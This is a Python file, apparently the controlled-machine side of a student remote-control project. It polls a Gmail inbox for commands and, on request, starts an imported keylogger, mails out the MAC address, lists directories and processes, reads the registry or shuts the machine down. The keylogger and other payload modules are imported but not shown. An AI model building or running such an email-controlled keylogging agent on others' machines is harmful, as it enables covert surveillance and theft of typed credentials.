import keylogger_server_gmail as kls
import app_process_server_gmail as ap
import shutdown_logout_server_gmail as sl
import directory_tree_server_gmail as dt
import registry_server_gmail as rs
import gmail as g
import uuid


def mac_address():
    g.send_mail("MAC", hex(uuid.getnode()))
    return
def key_logger():
    kls.keylogger()
    return
def app_process():
    ap.app_process()
    return
def shutdown_logout():
    sl.shutdown_logout()
    return
def directory_tree():
    dt.directory()
    return
def registry():
    rs.registry()
    return

def Connect():
    while True:
        cmd = g.read_mail()
        if "QUIT" in cmd:
            return
        if "MAC" in cmd:
            mac_address()
        elif "KEYLOG" in cmd:
            key_logger()
        elif "DIRECTORY" in cmd:
            directory_tree()
        # elif "LIVESCREEN" in cmd:
        #     live_screen()
        elif "APP_PRO" in cmd:
            app_process()       
        elif "REGISTRY" in cmd:
            registry()
        elif "SD_LO" in cmd:
            shutdown_logout() 

# def create_window():
#     # create Tk
#     root = tk.Tk()
#     # set window size
#     root.geometry("200x200")
#     # set name
#     root.title("Server")
#     # set background color #B4E4FF
#     root['bg'] = '#B4E4FF'

#     # create button OPEN
#     tk.Button(root, text = "OPEN", width = 10, height = 2, fg = '#FFFFFF', bg = '#2B3467', 
#         borderwidth=0, highlightthickness=0, command = Connect, relief="flat").place(x = 100, y = 100, anchor = "center")
    
#     # Vòng lặp chạy chương trình
#     root.mainloop()


# create_window()
if __name__ == '__main__':
    Connect()
    # read_mail()
    # while True:
    #     read_mail()
    #     time.sleep(10)


# https://skillshats.com/blogs/send-and-read-emails-with-gmail-api/ link có hết
#https://www.youtube.com/watch?v=HNtPG5ltFf8
#https://developers.google.com/gmail/api/guides/labels